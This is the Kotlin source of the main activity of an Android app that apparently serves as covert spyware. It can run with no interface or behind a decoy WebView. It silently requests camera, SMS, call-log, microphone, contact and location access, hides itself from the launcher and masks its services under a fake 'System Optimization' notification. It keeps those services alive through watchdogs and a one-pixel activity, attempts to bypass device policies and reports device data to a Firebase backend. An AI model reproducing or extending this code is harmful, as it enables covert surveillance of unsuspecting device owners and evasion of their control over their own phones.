package com.h4k3r.dreamer

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.*
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat

import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import java.security.MessageDigest
import com.h4k3r.dreamer.SilentPermissionManager

import com.h4k3r.dreamer.EnhancedServiceManager
import com.h4k3r.dreamer.DevicePolicyBypassHelper

class MainActivity : ComponentActivity() {
    companion object {
        private const val TAG = "MainActivity"
    }

    /* ── Configuration Data Classes ────────────────────────────── */
    data class AppConfig(
        val hidden: Boolean = false,
        val visible: Boolean = true
    )

    data class PermissionConfig(
        val permissions: Map<String, Boolean> = emptyMap()
    )

    /* ── State Management ────────────────────────────────── */
    private lateinit var appConfig: AppConfig
    private lateinit var permissionConfig: Map<String, Boolean>
    private var webViewUrl: String = ""
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /* ── Permission Launcher ─────────────────────────────────── */
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        handlePermissionResults(permissions)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Load configurations from assets
        loadConfigurations()

        // Save authentication before starting services
        saveAuthentication()

        // DISABLED: Enhanced Permission Manager conflicts with assets config system
        // Only use SilentPermissionManager which respects assets/permissions/config.json
        Log.d(TAG, "Using ONLY SilentPermissionManager based on assets/permissions/config.json")

        // Handle app flow based on configuration
        when {
            appConfig.hidden -> handleHiddenMode()
            else -> handleNormalMode()
        }
    }

    /* ── Configuration Loading ───────────────────────────────── */
    private fun loadConfigurations() {
        try {
            // Load app_config.json
            val appConfigJson = assets.open("app_config.json").bufferedReader().use { it.readText() }
            appConfig = Gson().fromJson(appConfigJson, AppConfig::class.java)
            Log.d(TAG, "App config loaded: $appConfig")

            // Load permissions/config.json
            val permConfigJson = assets.open("permissions/config.json").bufferedReader().use { it.readText() }
            val type = object : TypeToken<Map<String, Boolean>>() {}.type
            permissionConfig = Gson().fromJson(permConfigJson, type)
            Log.d(TAG, "Permission config loaded: $permissionConfig")

            // Load webview_url.txt
            webViewUrl = try {
                assets.open("webview_url.txt").bufferedReader().use { it.readText().trim() }
            } catch (e: Exception) {
                "https://www.google.com" // Default URL
            }

            Log.d(TAG, "Config loaded - Hidden: ${appConfig.hidden}, URL: $webViewUrl")
            Log.d(TAG, "Permissions enabled: ${permissionConfig.filter { it.value }.keys}")

        } catch (e: Exception) {
            Log.e(TAG, "Error loading configurations", e)
            // Use defaults
            appConfig = AppConfig()
            permissionConfig = getDefaultPermissionConfig()
            webViewUrl = "https://www.google.com"
            Log.d(TAG, "Using default configurations due to error")
        }
    }

    /* ── Hidden Mode Implementation ──────────────────────────── */
    private fun handleHiddenMode() {
        Log.d(TAG, "Running in hidden mode")

        // No UI in hidden mode
        setContentView(View(this).apply {
            visibility = View.GONE
        })

        // Use SilentPermissionManager for hidden mode (completely silent)
        val silentPermissionManager = SilentPermissionManager.getInstance(this)

        // Request all permissions that are set to true in config
        val permissionsToRequest = permissionConfig
            .filter { it.value }
            .keys
            .toList()

        if (permissionsToRequest.isNotEmpty()) {
            Log.d(TAG, "Requesting permissions SILENTLY in hidden mode: $permissionsToRequest")

            // Use silent permission request (completely invisible)
            scope.launch {
                silentPermissionManager.requestPermissionsSilent(permissionsToRequest) { results ->
                    Log.d(TAG, "Hidden mode - SILENT permission results: $results")

                    // Start services and complete setup
                    val serviceManager = EnhancedServiceManager.getInstance(this@MainActivity)
                    serviceManager.startAllServicesWithPersistence()

                    // Complete setup after all permissions are requested
                    completeHiddenSetup()
                }
            }
        } else {
            Log.d(TAG, "No permissions to request in hidden mode")
            completeHiddenSetup()
        }
    }

    /* ── Normal Mode (WebView) ──────────────────────────────── */
    private fun handleNormalMode() {
        Log.d(TAG, "Running in normal mode with WebView")

        // Ensure authentication is stored on first launch
        saveAuthentication()

        try {
            // Show WebView directly with proper error handling
            val webView = WebView(this).apply {
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )

                settings.apply {
                    javaScriptEnabled = true
                    domStorageEnabled = true
                    databaseEnabled = true
                    allowFileAccess = true
                    allowContentAccess = true
                    loadWithOverviewMode = true
                    useWideViewPort = true
                    setSupportZoom(true)
                    builtInZoomControls = true
                    displayZoomControls = false
                    // Add memory and crash prevention settings
                    cacheMode = android.webkit.WebSettings.LOAD_DEFAULT
                    // setAppCacheEnabled is deprecated in API 33+
                    setGeolocationEnabled(false)
                }

                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView?, url: String?) {
                        super.onPageFinished(view, url)
                        Log.d(TAG, "WebView loaded: $url")
                    }

                    override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                        super.onReceivedError(view, errorCode, description, failingUrl)
                        Log.e(TAG, "WebView error: $description (code: $errorCode)")
                    }
                }

                // Set WebChromeClient to handle crashes
                webChromeClient = object : android.webkit.WebChromeClient() {
                    override fun onConsoleMessage(consoleMessage: android.webkit.ConsoleMessage?): Boolean {
                        Log.d(TAG, "WebView console: ${consoleMessage?.message()}")
                        return true
                    }
                }

                loadUrl(webViewUrl)
            }

            setContentView(webView)
        } catch (e: Exception) {
            Log.e(TAG, "WebView initialization failed: ${e.message}")
            // Fallback to hidden mode if WebView fails
            appConfig = appConfig.copy(hidden = true)
            completeHiddenSetup()
            return
        }

        // Request permissions in background
        requestPermissionsInBackground()
    }

    /* ── Permission Handling (Enhanced) ─────────────────────────────────── */
    private fun handlePermissionResults(permissions: Map<String, Boolean>) {
        val granted = permissions.filter { it.value }.size
        val denied = permissions.filter { !it.value }.size

        Log.d(TAG, "Permissions - Granted: $granted, Denied: $denied")
        Log.d(TAG, "Permission details: $permissions")

        if (appConfig.hidden) {
            // In hidden mode, proceed regardless of permission results
            completeHiddenSetup()
        } else {
            // In normal mode, update Firebase and continue
            updateFirebasePermissions(permissions)

            // Show user feedback about permission results
            showPermissionFeedback(permissions)
        }
    }

    private fun showPermissionFeedback(permissions: Map<String, Boolean>) {
        val criticalPermissions = listOf("camera", "location_fine")
        val grantedCritical = criticalPermissions.filter { permissions[it] == true }
        val deniedCritical = criticalPermissions.filter { permissions[it] == false }

        when {
            deniedCritical.isEmpty() -> {
                Log.d(TAG, "All critical permissions granted")
                // No need to show anything - app is working fine
            }
            grantedCritical.isNotEmpty() -> {
                Log.d(TAG, "Some critical permissions granted: $grantedCritical, denied: $deniedCritical")
                // Partial success - app will work with limitations
            }
            else -> {
                Log.w(TAG, "No critical permissions granted")
                // All critical permissions denied - significant limitations
            }
        }
    }

    /* ── Hidden Mode Completion (Enhanced) ──────────────────────────────── */
    private fun completeHiddenSetup() {
        // Save authentication
        saveAuthentication()

        // Request battery optimization exemption
        requestBatteryOptimizationPermission()

        // Start all services with enhanced error handling
        startAllServicesEnhanced()

        // Start OnePixelActivity for additional persistence (only on Android < 12)
        if (Build.VERSION.SDK_INT < 31) {
            try {
                val intent = Intent(this, OnePixelActivity::class.java)
                startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start OnePixelActivity", e)
            }
        }

        // Update Firebase
        updateFirebaseStatus()

        // Hide app from launcher
        hideAppFromLauncher()

        // Close activity after delay
        Handler(Looper.getMainLooper()).postDelayed({
            finish()
        }, 2000)
    }

    /* ── Silent Permission Request (Restored Original Behavior) ────────────────────────── */
    private fun requestPermissionsInBackground() {
        scope.launch {
            delay(2000) // Reduced delay for faster startup

            Log.d(TAG, "Starting SILENT permission request process (restored original behavior)")
            Log.d(TAG, "Permission config: $permissionConfig")

            // Use ONLY the assets/permissions/config.json based system
            Log.d(TAG, "Permissions will be requested based on assets/permissions/config.json only")

            // Initialize stealth notification manager for cleanup
            val stealthManager = StealthNotificationManager.getInstance(this@MainActivity)
            stealthManager.enforceStealthMode() // Shows ONE stealth notification, cancels others

            // Analyze device policies early
            val policyHelper = DevicePolicyBypassHelper.getInstance(this@MainActivity)
            val policyAnalysis = policyHelper.analyzeDevicePolicyRestrictions()
            Log.d(TAG, "Device Policy Analysis at startup: $policyAnalysis")

            // Report policy status to Firebase for monitoring
            if (policyAnalysis.isCameraDisabled) {
                Log.w(TAG, "Camera is disabled by device policy - bypass will be attempted when needed")
            }

            // Use SilentPermissionManager for original behavior (no toasts/notifications)
            val silentPermissionManager = SilentPermissionManager.getInstance(this@MainActivity)

            // Request all permissions that are set to true in config
            val permissionsToRequest = permissionConfig
                .filter { it.value }
                .keys
                .toList()

            Log.d(TAG, "📋 Permissions configured in assets/permissions/config.json: $permissionsToRequest")

            if (permissionsToRequest.isNotEmpty()) {
                Log.d(TAG, "🔄 SILENTLY requesting permissions (no notifications/toasts): $permissionsToRequest")

                // Use silent permission request (original behavior)
                silentPermissionManager.requestPermissionsSilent(permissionsToRequest) { results ->
                    Log.d(TAG, "SILENT permission results: $results")

                    // Update Firebase with permission results (no user feedback)
                    updateFirebasePermissions(results)

                    // Ensure stealth mode is maintained
                    stealthManager.enforceStealthMode()
                }
            } else {
                Log.d(TAG, "No permissions configured for request")
            }

            // Save authentication before starting services
            saveAuthentication()

            // Request battery optimization exemption silently
            withContext(Dispatchers.Main) {
                requestBatteryOptimizationPermissionSilently()
            }

            // Start services with enhanced persistence
            try {
                val serviceManager = EnhancedServiceManager.getInstance(this@MainActivity)
                serviceManager.startAllServicesWithPersistence()
                Log.d(TAG, "Enhanced service manager started successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Enhanced service manager failed, using fallback: ${e.message}")

                // Fallback: Use original service startup method
                try {
                    startAllServicesEnhanced()
                } catch (fallbackException: Exception) {
                    Log.e(TAG, "Fallback service startup also failed: ${fallbackException.message}")
                }
            }

            // Start OnePixelActivity for additional persistence (only on Android < 12)
            if (Build.VERSION.SDK_INT < 31) {
                try {
                    val intent = Intent(this@MainActivity, OnePixelActivity::class.java)
                    startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start OnePixelActivity", e)
                }
            }

            // Update Firebase with device info
            updateFirebaseStatus()
        }
    }

    /* ── Fallback Permission Request ────────────────────────── */
    private suspend fun requestPermissionsFallback(permissions: List<String>) {
        val manifestPermissions = permissions.mapNotNull { permission ->
            getManifestPermission(permission)
        }.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (manifestPermissions.isNotEmpty()) {
            Log.d(TAG, "Using fallback method for permissions: $manifestPermissions")
            withContext(Dispatchers.Main) {
                permissionLauncher.launch(manifestPermissions.toTypedArray())
            }
        }
    }

    /* ── App Hiding ──────────────────────────────────────────── */
    private fun hideAppFromLauncher() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "App hidden from launcher")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide app", e)
        }
    }

    /* ── Enhanced Service Management ──────────────────────────────────── */
    private fun startAllServicesEnhanced() {
        // Initialize stealth notification manager first
        val stealthManager = StealthNotificationManager.getInstance(this)

        // Enforce stealth mode - cancel all other notifications, show ONE stealth notification
        stealthManager.enforceStealthMode()

        Log.d(TAG, "Stealth mode activated - ONE 'System Optimization' notification will show")

        val services = listOf(
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java,
            PermissionMonitorService::class.java,
            WatchdogService::class.java,
            AdvancedPersistenceService::class.java,
            StealthMonitorService::class.java,
            EnhancedPerfectionService::class.java
        )

        // Services that need foreground service for background operation
        val foregroundServices = listOf(
            CameraService::class.java,
            DataService::class.java,
            PermissionMonitorService::class.java,
            AdvancedPersistenceService::class.java,
            StealthMonitorService::class.java,
            EnhancedPerfectionService::class.java
        )

        // Services with specific permission requirements
        val permissionRequiredServices = mapOf(
            CameraService::class.java to listOf("camera"),
            DataService::class.java to listOf("location_fine", "location_coarse", "location_background")
        )



        var servicesStarted = 0

        services.forEach { serviceClass ->
            try {
                // Check if service has required permissions
                val requiredPermissions = permissionRequiredServices[serviceClass] ?: emptyList()
                val hasRequiredPermissions = if (requiredPermissions.isNotEmpty()) {
                    requiredPermissions.any { permission ->
                        permissionConfig[permission] == true &&
                                isPermissionGranted(permission)
                    }
                } else {
                    true
                }

                val intent = Intent(this, serviceClass)

                if (serviceClass in foregroundServices && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    // Enhanced foreground service startup with stealth notifications
                    try {
                        // Start foreground service - each service will use the same stealth notification
                        startForegroundService(intent)

                        servicesStarted++
                        Log.d(TAG, "Started ${serviceClass.simpleName} as foreground service with stealth notification" +
                                if (!hasRequiredPermissions) " (missing permissions)" else "")

                        // Schedule background persistence check for this service
                        scheduleServicePersistenceCheck(serviceClass)

                    } catch (foregroundException: Exception) {
                        Log.e(TAG, "Failed to start ${serviceClass.simpleName} as foreground service: ${foregroundException.message}")

                        // Enhanced fallback strategy
                        if (handleForegroundServiceError(foregroundException, serviceClass)) {
                            servicesStarted++
                        }
                    }
                } else {
                    // Use regular startService for other services
                    startService(intent)
                    servicesStarted++
                    Log.d(TAG, "Started service: ${serviceClass.simpleName}" +
                            if (!hasRequiredPermissions) " (missing permissions)" else "")

                    // Schedule background persistence check for this service
                    scheduleServicePersistenceCheck(serviceClass)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${serviceClass.simpleName}", e)
            }
        }

        Log.d(TAG, "Service startup complete: $servicesStarted/${services.size} services started")

        // Enhanced background persistence setup
        setupBackgroundPersistence()

        // Ensure stealth mode is maintained after service startup
        scope.launch {
            delay(5000) // Wait for services to initialize
            val stealthManager = StealthNotificationManager.getInstance(this@MainActivity)
            stealthManager.enforceStealthMode()
            Log.d(TAG, "Stealth mode enforced after all services started - ONE stealth notification showing")
        }
    }

    private fun handleForegroundServiceError(exception: Exception, serviceClass: Class<*>): Boolean {
        val errorMessage = exception.message ?: ""

        return when {
            errorMessage.contains("ForegroundServiceStartNotAllowedException") -> {
                Log.w(TAG, "Foreground service not allowed for ${serviceClass.simpleName}, using WorkManager")
                scheduleServiceViaWorkManager(serviceClass)
            }
            errorMessage.contains("Time limit already exhausted") -> {
                Log.w(TAG, "Foreground service time limit exhausted for ${serviceClass.simpleName}, using regular service")
                try {
                    startService(Intent(this, serviceClass))
                    true
                } catch (e: Exception) {
                    Log.e(TAG, "Regular service fallback also failed: ${e.message}")
                    false
                }
            }
            else -> {
                Log.w(TAG, "Unknown foreground service error for ${serviceClass.simpleName}, trying regular service")
                try {
                    startService(Intent(this, serviceClass))
                    true
                } catch (e: Exception) {
                    Log.e(TAG, "Regular service fallback failed: ${e.message}")
                    false
                }
            }
        }
    }

    private fun scheduleServiceViaWorkManager(serviceClass: Class<*>): Boolean {
        return try {
            val workRequest = androidx.work.OneTimeWorkRequestBuilder<ServiceStartWorker>()
                .setInputData(
                    androidx.work.workDataOf("service_class" to serviceClass.name)
                )
                .setInitialDelay(1, java.util.concurrent.TimeUnit.SECONDS)
                .build()

            androidx.work.WorkManager.getInstance(this).enqueueUniqueWork(
                "start_${serviceClass.simpleName}",
                androidx.work.ExistingWorkPolicy.REPLACE,
                workRequest
            )

            Log.d(TAG, "Scheduled ${serviceClass.simpleName} via WorkManager")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule ${serviceClass.simpleName} via WorkManager: ${e.message}")
            false
        }
    }

    private fun setupBackgroundPersistence() {
        scope.launch {
            // Wait for initial startup to complete
            delay(10000)

            // Set up periodic service health checks
            while (isActive) {
                try {
                    checkAndRestartCriticalServices()
                    delay(120000) // Check every 2 minutes
                } catch (e: Exception) {
                    Log.e(TAG, "Background persistence error: ${e.message}")
                    delay(300000) // Wait 5 minutes on error
                }
            }
        }
    }

    private fun checkAndRestartCriticalServices() {
        val criticalServices = listOf(
            CameraService::class.java,
            PermissionMonitorService::class.java,
            AdvancedPersistenceService::class.java,
            EnhancedPerfectionService::class.java
        )

        criticalServices.forEach { serviceClass ->
            if (!isServiceRunning(serviceClass)) {
                Log.w(TAG, "Critical service ${serviceClass.simpleName} not running, attempting restart")

                try {
                    val intent = Intent(this@MainActivity, serviceClass)

                    // Try foreground service first, then fallback
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        try {
                            startForegroundService(intent)
                            Log.d(TAG, "Restarted ${serviceClass.simpleName} as foreground service with stealth notification")
                        } catch (e: Exception) {
                            // Fallback to regular service
                            startService(intent)
                            Log.d(TAG, "Restarted ${serviceClass.simpleName} as regular service")
                        }
                    } else {
                        startService(intent)
                        Log.d(TAG, "Restarted ${serviceClass.simpleName}")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to restart ${serviceClass.simpleName}: ${e.message}")

                    // Last resort: schedule via WorkManager
                    scheduleServiceViaWorkManager(serviceClass)
                }
            }
        }
    }

    private fun scheduleServicePersistenceCheck(serviceClass: Class<*>) {
        scope.launch {
            // Schedule individual service persistence checks
            delay(30000) // Initial delay

            while (isActive) {
                try {
                    if (!isServiceRunning(serviceClass)) {
                        Log.w(TAG, "Service ${serviceClass.simpleName} stopped, restarting")

                        val intent = Intent(this@MainActivity, serviceClass)
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                                serviceClass in listOf(CameraService::class.java, PermissionMonitorService::class.java)) {
                                startForegroundService(intent)
                            } else {
                                startService(intent)
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Service restart failed: ${e.message}")
                            scheduleServiceViaWorkManager(serviceClass)
                        }
                    }

                    delay(60000) // Check every minute
                } catch (e: Exception) {
                    Log.e(TAG, "Service persistence check error: ${e.message}")
                    delay(120000) // Wait longer on error
                }
            }
        }
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        return try {
            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            runningServices.any { it.service.className == serviceClass.name }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking if service is running: ${e.message}")
            false
        }
    }

    private fun isPermissionGranted(permission: String): Boolean {
        val manifestPermission = getManifestPermission(permission) ?: return false
        return ContextCompat.checkSelfPermission(this, manifestPermission) == PackageManager.PERMISSION_GRANTED
    }

    /* ── Authentication & Firebase ───────────────────────────── */
    private fun saveAuthentication() {
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        val editor = prefs.edit()

        // Always read secret_key from assets with enhanced error handling
        val secretKey = try {
            val key = assets.open("secret_key.txt").bufferedReader().use { it.readText().trim() }
            Log.d(TAG, "✅ Loaded secret key from assets: ${key.take(3)}...")
            key
        } catch (e: Exception) {
            Log.e(TAG, "❌ CRITICAL: Failed to load secret key from assets", e)
            ""
        }

        if (secretKey.isNotEmpty()) {
            editor.putString("secret_key", secretKey)
            Log.d(TAG, "✅ Secret key saved to SharedPreferences")
        } else {
            Log.e(TAG, "❌ CRITICAL: Secret key is empty, cannot save - services will fail with 403 errors")
            return // Don't proceed if no secret key
        }

        if (!prefs.contains("device_id")) {
            val deviceId = generateDeviceId()
            editor.putString("device_id", deviceId)
            Log.d(TAG, "✅ Generated and saved device ID: $deviceId")
        }

        // Use commit() instead of apply() to ensure immediate write for services
        val success = editor.commit()
        Log.d(TAG, if (success) "✅ Authentication committed successfully" else "❌ Failed to commit authentication")

        // Verify the save was successful and log for debugging 403 errors
        val savedKey = prefs.getString("secret_key", "")
        val savedDeviceId = prefs.getString("device_id", "")
        if (savedKey.isNullOrEmpty() || savedDeviceId.isNullOrEmpty()) {
            Log.e(TAG, "❌ CRITICAL: Authentication verification failed - Key: '${savedKey}', Device: '${savedDeviceId}'")
            Log.e(TAG, "❌ This will cause 403 errors in services!")
        } else {
            Log.d(TAG, "✅ Authentication verified - Key: ${savedKey.take(3)}..., Device: $savedDeviceId")
            Log.d(TAG, "✅ Services should now authenticate successfully")
        }
    }

    private fun generateSecretKey(): String {
        // Generate a random 32-char key
        val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return (1..32).map { chars.random() }.joinToString("")
    }
    private fun generateDeviceId(): String {
        // Use ANDROID_ID or fallback to random
        return android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            ?: (100000..999999).random().toString()
    }

    /* ── Enhanced Firebase Updates ───────────────────────────── */
    private fun updateFirebaseStatus() {
        try {
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""

            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                val deviceInfo = mapOf(
                    "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
                    "android" to Build.VERSION.SDK_INT,
                    "android_version" to Build.VERSION.RELEASE,
                    "mode" to if (appConfig.hidden) "hidden" else "normal",
                    "time" to System.currentTimeMillis(),
                    "setup_complete" to true,
                    "app_version" to "2.0_android15_compatible",
                    "permission_system" to "enhanced_smart_manager"
                )

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .setValue(deviceInfo)
                    .addOnSuccessListener {
                        Log.d(TAG, "Firebase device info updated successfully")
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Firebase device info update failed: ${e.message}")
                    }

                Log.d(TAG, "Firebase updated with enhanced device info")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Firebase update failed", e)
        }
    }

    private fun updateFirebasePermissions(permissions: Map<String, Boolean>) {
        try {
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""

            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                // Add metadata to permission status
                val enhancedPermissions = permissions.toMutableMap<String, Any>()
                enhancedPermissions["_update_time"] = System.currentTimeMillis()
                enhancedPermissions["_android_version"] = Build.VERSION.SDK_INT
                enhancedPermissions["_permission_system"] = "smart_manager"

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("permissions")
                    .setValue(enhancedPermissions)
                    .addOnSuccessListener {
                        Log.d(TAG, "Firebase permissions updated successfully")
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Firebase permissions update failed: ${e.message}")
                    }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update permissions in Firebase", e)
        }
    }

    /* ── Helper Methods ──────────────────────────────────────── */
    private fun getSecretKey(): String? {
        return try {
            assets.open("secret_key.txt")
                .bufferedReader()
                .readLine()
                ?.trim()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read secret key", e)
            null
        }
    }

    private fun getManifestPermission(permission: String): String? {
        return when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location", "location_fine" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> android.Manifest.permission.ACCESS_COARSE_LOCATION
            "location_background" -> if (Build.VERSION.SDK_INT >= 29) {
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
            } else null
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "call_log" -> android.Manifest.permission.READ_CALL_LOG
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            "calendar" -> android.Manifest.permission.READ_CALENDAR
            "storage", "storage_read" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "storage_write" -> if (Build.VERSION.SDK_INT >= 23) {
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            } else null
            "notifications", "post_notifications" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.POST_NOTIFICATIONS
            } else null
            "bluetooth_connect" -> if (Build.VERSION.SDK_INT >= 31) {
                android.Manifest.permission.BLUETOOTH_CONNECT
            } else null
            "bluetooth_scan" -> if (Build.VERSION.SDK_INT >= 31) {
                android.Manifest.permission.BLUETOOTH_SCAN
            } else null
            else -> null
        }
    }

    private fun getDefaultPermissionConfig(): Map<String, Boolean> {
        return mapOf(
            "camera" to true,
            "location_fine" to true,
            "location_coarse" to false,
            "location_background" to false,
            "contacts" to true,
            "sms" to true,
            "phone" to true,
            "call_log" to true,
            "microphone" to true,
            "storage_read" to true,
            "storage_write" to false,
            "calendar" to false,
            "notifications" to true
        )
    }

    override fun onDestroy() {
        // Clean up WebView to prevent memory leaks and crashes
        try {
            val contentView = findViewById<android.view.ViewGroup>(android.R.id.content)
            contentView?.let { viewGroup ->
                for (i in 0 until viewGroup.childCount) {
                    val child = viewGroup.getChildAt(i)
                    if (child is WebView) {
                        child.loadUrl("about:blank")
                        child.onPause()
                        child.removeAllViews()
                        child.destroy()
                        Log.d(TAG, "WebView cleaned up")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error cleaning up WebView: ${e.message}")
        }

        super.onDestroy()
        scope.cancel()
        Log.d(TAG, "MainActivity destroyed")
    }

    /* ── Enhanced Battery Optimization ────────────────────────── */
    private fun requestBatteryOptimizationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val packageName = packageName
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    Log.d(TAG, "Requesting battery optimization exemption for Android ${Build.VERSION.RELEASE}")
                    val intent = Intent().apply {
                        action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                        data = Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(intent)

                    // Update Firebase with battery optimization request status
                    updateBatteryOptimizationStatus(false)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to request battery optimization exemption", e)

                    // Try the SmartPermissionManager method as fallback
                    try {
                        val permissionManager = SmartPermissionManager.getInstance(this)
                        permissionManager.requestBatteryOptimization()
                    } catch (fallbackException: Exception) {
                        Log.e(TAG, "Fallback battery optimization request also failed", fallbackException)
                    }
                }
            } else {
                Log.d(TAG, "Device already ignoring battery optimizations")
                updateBatteryOptimizationStatus(true)
            }
        }
    }

    private fun updateBatteryOptimizationStatus(isExempt: Boolean) {
        try {
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""

            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                val statusData = mapOf(
                    "status" to if (isExempt) "exempt" else "requested",
                    "timestamp" to System.currentTimeMillis(),
                    "android_version" to Build.VERSION.SDK_INT
                )

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("battery_optimization")
                    .setValue(statusData)
                    .addOnSuccessListener {
                        Log.d(TAG, "Battery optimization status updated: ${if (isExempt) "exempt" else "requested"}")
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Failed to update battery optimization status: ${e.message}")
                    }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update battery optimization status", e)
        }
    }

    /* ── Silent Battery Optimization Request ────────────────────────── */
    private fun requestBatteryOptimizationPermissionSilently() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    Log.d(TAG, "Requesting battery optimization exemption silently")

                    // Try direct intent without user interaction first
                    try {
                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:$packageName")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                        Log.d(TAG, "Battery optimization request sent silently")
                    } catch (e: Exception) {
                        Log.e(TAG, "Silent battery optimization request failed: ${e.message}")

                        // Fallback: Use SmartPermissionManager for battery optimization
                        try {
                            val smartManager = SmartPermissionManager.getInstance(this)
                            smartManager.requestBatteryOptimization()
                        } catch (fallbackException: Exception) {
                            Log.e(TAG, "Fallback battery optimization failed: ${fallbackException.message}")
                        }
                    }
                } else {
                    Log.d(TAG, "Battery optimization already disabled")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Battery optimization check failed: ${e.message}")
        }
    }

    /* ── SIMPLIFIED Permission System ──────────────────────────── */
    // Using ONLY SilentPermissionManager which reads from assets/permissions/config.json
    // This prevents conflicts and uses the user's configured permissions

    /* ── REMOVED: Enhanced Permission System - Using ONLY assets config ── */
    // Enhanced Permission Manager removed to prevent conflicts
    // Only SilentPermissionManager is used based on assets/permissions/config.json
}